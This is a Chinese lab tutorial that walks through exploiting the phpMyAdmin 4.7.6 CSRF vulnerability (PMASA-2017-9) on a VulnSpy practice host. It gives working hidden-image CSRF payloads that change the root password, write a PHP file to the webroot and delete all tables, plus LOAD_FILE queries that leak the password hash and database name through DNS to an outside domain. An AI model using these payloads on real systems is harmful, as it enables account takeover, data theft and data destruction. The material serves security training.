[作者：Ambulong](https://bbs.ichunqiu.com/thread-41620-1-1.html?from=beef)

  

phpMyAdmin是个知名MySQL/MariaDB在线管理工具，phpMyAdmin团队在4.7.7版本中修复了一个危害严重的CSRF漏洞（[PMASA-2017-9](https://www.phpmyadmin.net/security/PMASA-2017-9/)），攻击者可以通过诱导管理员访问恶意页面，悄无声息地执行任意SQL语句。

该篇文章我们将结合VulnSpy的[在线phpMyAdmin环境](https://bbs.ichunqiu.com/thread-41620-1-1.html?from=beef)来熟悉该漏洞的利用。

在线 phpMyAdmin CSRF
演练地址：[https://www.vulnspy.com/?u=pmasa-2017-9](https://bbs.ichunqiu.com/thread-41620-1-1.html?from=beef)

注：重启演示靶机即可重置靶机

## 1 在线创建 phpMyAdmin 环境

点击 VulnSpy
提供的创建靶机地址（[https://www.vsplate.com/?github=vulnspy/PMASA-2017-9](https://bbs.ichunqiu.com/thread-41620-1-1.html?from=beef)）

  
![image.png](https://image.3001.net/images/20180613/15288735978254.png!small)  

跳转到 VSPlate 后，直接点击`GO`按钮，便会自动创建一个 phpMyAdmin 环境

  
![image.png](https://image.3001.net/images/20180613/15288736057547.png!small)

![image.png](https://image.3001.net/images/20180613/15288736144253.png!small)

  

打开`演示地址`的链接，我们的 phpMyAdmin 就创建完成了。

  
![image.png](https://image.3001.net/images/20180613/15288736204910.png!small)  

使用帐号 `root` ，密码 `toor` ，登录 phpMyAdmin 。根据页面信息，我们可以发现当前 phpMyAdmin 的版本为
4.7.6，刚好匹配存在漏洞的 phpMyAdmin 版本。

![image.png](https://image.3001.net/images/20180613/15288736295731.png!small)  

## 2 CSRF 漏洞利用 - 修改当前数据库用户密码

我们知道，如果要利用CSRF来删除或修改数据库内容，通查情况下需要提前知道数据库名、表名和字段名。这样利用显得有点复杂，成功率也有限，因此本文我们将介绍几种较为通用的利用方式。

在MySQL中支持使用SQL语句来修改当前用户密码。比如将当前用户密码修改为`[www.vulnspy.com](http://www.vulnspy.com)`，对应的SQL语句为：

    
    
    SET passsword=PASSWORD('www.vulnspy.com');
    

### 利用演示

2.1 模拟管理员登录phpMyAdmin的状态。

用帐号 root 密码 toor 登录 phpMyAdmin 。

![image.png](https://image.3001.net/images/20180613/15288736416773.png!small)  

2.2 创建含有[恶意代码](https://bbs.ichunqiu.com/thread-41620-1-1.html?from=beef)的页面。

文件名 2.payload.html （将下面的域名换成自己的靶机域名）

    
    
    <p>Hello World</p>
    <img src="http://7f366ec1afc5832757a402b5355132d0.vsplate.me/sql.php?db=mysql&table=user&sql_query=SET%20password
    %20=%20PASSWORD(%27www.vulnspy.com%27)" style="display:none;" />
    

2.3 用浏览器打开含有恶意代码的文件 2.payload.html

  
![image.png](https://image.3001.net/images/20180613/15288736495277.png!small)  

回到上一步打开的phpMyAdmin页面，发现已自动退出，而且用原来的密码 toor 已经无法登录。

![image.png](https://image.3001.net/images/20180613/15288736565947.png!small)  

2.4 使用密码
[www.vulnspy.com](https://bbs.ichunqiu.com/thread-41620-1-1.html?from=beef)
登录成功，表明利用成功

  
![image.png](https://image.3001.net/images/20180613/15288736637091.png!small)  

## 3 CSRF 漏洞利用 - 写文件

MySQL支持将查询结果写到文件当中，我们可以利用该特性来写入PHP文件。比如将代码`<?php
phpinfo();?>`写到文件`/var/www/html/test.php`中，对应的SQL语句为：

    
    
    select '<?php phpinfo();?>' into outfile '/var/www/html/test.php';
    

### 利用演示

3.1 将上一个演示步骤相同，只需将2.2中的文件代码改成：

    
    
    <p>Hello World</p>
    <img src="http://7f366ec1afc5832757a402b5355132d0.vsplate.me/sql.php?db=mysql&table=user&sql_query=select '<?php phpinfo();?>' into outfile '/var/www/html/test.php';" style="display:none;" />
    

3.2 用浏览器打开含有恶意代码的文件

3.3 访问 test.php

  
![image.png](https://image.3001.net/images/20180613/15288736733643.png!small)  

可见文件已经写入成功。

## 4 CSRF 漏洞利用 - 获取数据

MySQL提供了`load_file()`函数来支持读取文件内容的操作。比如读取文件`/etc/passwd`内容，，对应的SQL语句为：

    
    
    select load_file('/etc/passwd');
    

但是对于CSRF漏洞来说，该读取操作实在目标用户端执行的，我们依然无法知道文件读取的结果。而`load_file()`在Windows下支持从网络共享文件夹中读取文件，如`\\192.168.1.100\share\vulnspy.txt`。网络共享文件的地址处不仅可以填写IP还可以填写域名，我们可以通过DNS解析来获取查询的数据。

此处需要用到 DNSLOG
之类的工具：[https://github.com/BugScanTeam/DNSLog](https://bbs.ichunqiu.com/thread-41620-1-1.html?from=beef)，
这类工具可以记录域名的 DNS 解析记录

比如通过DNS解析来获取当前 MySQL root 用户密码，对应的SQL语句为：

    
    
    SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.vulnspy.com\\test'));
    

获取当前数据库名：

    
    
    SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.vulnspy.com\\test'));
    

如果请求成功，查询结果将作为二级域名的一部分出现在我们的 DNS 解析记录当中。

该环境暂无法演示

## 5 CSRF 漏洞利用 - 清空所有数据表

如果上面几种利用方式都无法直接造成直接的影响，我们可以利用SQL语句来清空当前MySQL用户可操作的所有数据表。

我们用命令

    
    
    SELECT CONCAT('DELETE FROM ',TABLE_SCHEMA,'.',TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT LIKE '%_schema' and TABLE_SCHEMA!='mysql' LIMIT 0,1
    

来获取数据名和表名，并将其拼接成删除语句（如：`DELETE FROM vulnspy_tables.inv`），通过 `execute`
来执行生成的删除语句：

    
    
    set @del = (SELECT CONCAT('DELETE FROM ',TABLE_SCHEMA,'.',TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT LIKE '%_schema' and TABLE_SCHEMA!='mysql' LIMIT 0,1);
    prepare stmt from @del;
    execute stmt;
    

但是 execute 一次只能执行一条SQL语句，因此我们可以利用循环语句来逐一执行：

    
    
    DROP PROCEDURE IF EXISTS EMPT;
    DELIMITER $$
        CREATE PROCEDURE EMPT()
        BEGIN
            DECLARE i INT;
            SET i = 0;
            WHILE i < 100 DO
                SET @del = (SELECT CONCAT('DELETE FROM ',TABLE_SCHEMA,'.',TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT LIKE '%_schema' and TABLE_SCHEMA!='mysql' LIMIT i,1);
                PREPARE STMT FROM @del;
                EXECUTE STMT;
                SET i = i +1;
            END WHILE;
        END $$
    DELIMITER ;
    
    CALL EMPT();
    

### 利用演示

5.1 Payload如下

    
    
    <p>Hello World</p>
    <img src="http://7f366ec1afc5832757a402b5355132d0.vsplate.me/import.php?db=mysql&table=user&sql_query=DROP+PROCEDURE+IF+EXISTS+EMPT%3B%0ADELIMITER+%24%24%0A++++CREATE+PROCEDURE+EMPT%28%29%0A++++BEGIN%0A++++++++DECLARE+i+INT%3B%0A++++++++SET+i+%3D+0%3B%0A++++++++WHILE+i+%3C+100+DO%0A++++++++++++SET+%40del+%3D+%28SELECT+CONCAT%28%27DELETE+FROM+%27%2CTABLE_SCHEMA%2C%27.%27%2CTABLE_NAME%29+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+LIKE+%27%25_schema%27+and+TABLE_SCHEMA%21%3D%27mysql%27+LIMIT+i%2C1%29%3B%0A++++++++++++PREPARE+STMT+FROM+%40del%3B%0A++++++++++++EXECUTE+stmt%3B%0A++++++++++++SET+i+%3D+i+%2B1%3B%0A++++++++END+WHILE%3B%0A++++END+%24%24%0ADELIMITER+%3B%0A%0ACALL+EMPT%28%29%3B%0A" style="display:none;" />
    

5.2 用浏览器打开含有恶意代码的文件

5.3 回到 phpMyAdmin 中查看数据

可以发现数据库`vulnspy_tables`和数据库`vulnspy_test`中的数据已经被清空。

  
![image.png](https://image.3001.net/images/20180613/15288736869606.png!small)  

## 6 总结

这个 phpMyAdmin 的 CSRF 漏洞利用有点类似 SQL
盲注的利用，但是对于漏洞触发的时间不可控（即不知道管理员何时会访问含有恶意代码的页面），因此需要更加通用的利用方式。通过该实验，不仅了解该漏洞的内容，还可以更加熟悉CSRF漏洞的利用。

本文转载自：phpMyAdmin 4.7.x CSRF 漏洞利用 -[https://blog.vulnspy.com/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/](https://bbs.ichunqiu.com/thread-41620-1-1.html?from=beef)

  

i春秋推出优享会员制，开通会员可以免费畅享多类课程、实验、CTF赛题等付费内容，并可享有包括会员日专属福利、就业推荐等多种特权福利，更多活动详情可点击：[https://bbs.ichunqiu.com/thread-40795-1-1.html](https://bbs.ichunqiu.com/thread-40795-1-1.html?from=qd)了解哦~  

